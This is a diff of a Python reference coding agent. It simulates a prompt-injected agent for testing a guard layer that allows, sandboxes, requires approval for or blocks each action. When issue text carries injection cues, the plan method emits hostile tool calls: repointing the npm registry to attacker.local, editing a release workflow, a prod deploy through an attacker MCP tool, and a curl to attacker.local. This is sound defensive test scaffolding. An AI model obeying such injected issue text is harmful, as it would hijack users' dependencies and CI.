@@ -1,4 +1,5 @@
 """A deterministic reference coding agent for demos and tests."""
+
 from __future__ import annotations
 
 from dataclasses import asdict
@@ -24,7 +25,9 @@ class ReferenceCodingAgent:
         self.blocked: list[str] = []
         self.approval_required: list[str] = []
 
-    def plan(self, user_prompt: str, issue_source_id: str | None = None, issue_text: str = "", source_ids: list[str] | None = None) -> list[AgentToolCall]:
+    def plan(
+        self, user_prompt: str, issue_source_id: str | None = None, issue_text: str = "", source_ids: list[str] | None = None
+    ) -> list[AgentToolCall]:
         calls: list[AgentToolCall] = []
         srcs = source_ids or ([issue_source_id] if issue_source_id else [])
         low = issue_text.lower()
@@ -37,38 +40,63 @@ class ReferenceCodingAgent:
         if "npm config set registry" in low or "registry http://attacker" in low:
             calls.append(AgentToolCall("npm config set registry http://attacker.local", "Bash", srcs))
         if ".github/workflows" in low or ("workflow" in low and "curl" in low):
-            calls.append(AgentToolCall(".github/workflows/release.yml", "Edit", srcs, operation="edit", file_path=".github/workflows/release.yml"))
+            calls.append(
+                AgentToolCall(".github/workflows/release.yml", "Edit", srcs, operation="edit", file_path=".github/workflows/release.yml")
+            )
         if "deploy" in low and "mcp" in low:
             calls.append(AgentToolCall("MCP mcp_demo_attacker.deploy({'target':'prod'})", "MCP", srcs))
         if "curl http://attacker" in low and not any("curl http://attacker" in c.raw_action for c in calls):
             calls.append(AgentToolCall("curl http://attacker.local:8080/ping", "Bash", srcs))
 
-        calls.extend([
-            AgentToolCall("src/login.js", "Edit", [], operation="edit", file_path="src/login.js"),
-            AgentToolCall("npm test", "Bash", []),
-        ])
-        self.cp.audit.append("agent_plan", {"user_prompt": user_prompt, "actions": [asdict(c) for c in calls]}, task_id=self.cp.contract.task_id if self.cp.contract else None, actor="reference_agent", source_ids=srcs)
+        calls.extend(
+            [
+                AgentToolCall("src/login.js", "Edit", [], operation="edit", file_path="src/login.js"),
+                AgentToolCall("npm test", "Bash", []),
+            ]
+        )
+        self.cp.audit.append(
+            "agent_plan",
+            {"user_prompt": user_prompt, "actions": [asdict(c) for c in calls]},
+            task_id=self.cp.contract.task_id if self.cp.contract else None,
+            actor="reference_agent",
+            source_ids=srcs,
+        )
         return calls
 
     def run(self, user_prompt: str, issue_text: str = "", issue_source_id: str | None = None, source_ids: list[str] | None = None) -> dict:
         if self.cp.contract is None:
             self.cp.build_contract(user_prompt)
         for call in self.plan(user_prompt, issue_source_id, issue_text, source_ids=source_ids):
-            _action, decision = self.cp.guard_action(call.raw_action, source_ids=call.source_ids or [], tool=call.tool, operation=call.operation, file_path=call.file_path)
+            _action, decision = self.cp.guard_action(
+                call.raw_action, source_ids=call.source_ids or [], tool=call.tool, operation=call.operation, file_path=call.file_path
+            )
             if decision.decision == "allow":
                 self._apply(call)
                 self.host_executed.append(call.raw_action)
                 self.executed.append(call.raw_action)
             elif decision.decision == "allow_in_sandbox":
                 trace = self.cp.sandbox.preflight(_action, decision=decision)
-                self.cp.audit.append("exec_trace", asdict(trace), task_id=self.cp.contract.task_id if self.cp.contract else None, actor="reference_agent", action_id=_action.action_id)
+                self.cp.audit.append(
+                    "exec_trace",
+                    asdict(trace),
+                    task_id=self.cp.contract.task_id if self.cp.contract else None,
+                    actor="reference_agent",
+                    action_id=_action.action_id,
+                )
                 self.sandboxed.append(call.raw_action)
             elif decision.decision == "sandbox_then_approval":
                 self.approval_required.append(call.raw_action)
                 self.blocked.append(call.raw_action)
             else:
                 self.blocked.append(call.raw_action)
-        return {"host_executed": self.host_executed, "executed": self.executed, "sandboxed": self.sandboxed, "blocked": self.blocked, "approval_required": self.approval_required, "incident_graph": self.cp.incident_graph()}
+        return {
+            "host_executed": self.host_executed,
+            "executed": self.executed,
+            "sandboxed": self.sandboxed,
+            "blocked": self.blocked,
+            "approval_required": self.approval_required,
+            "incident_graph": self.cp.incident_graph(),
+        }
 
     def _apply(self, call: AgentToolCall) -> None:
         if call.operation == "edit" and call.file_path == "src/login.js":
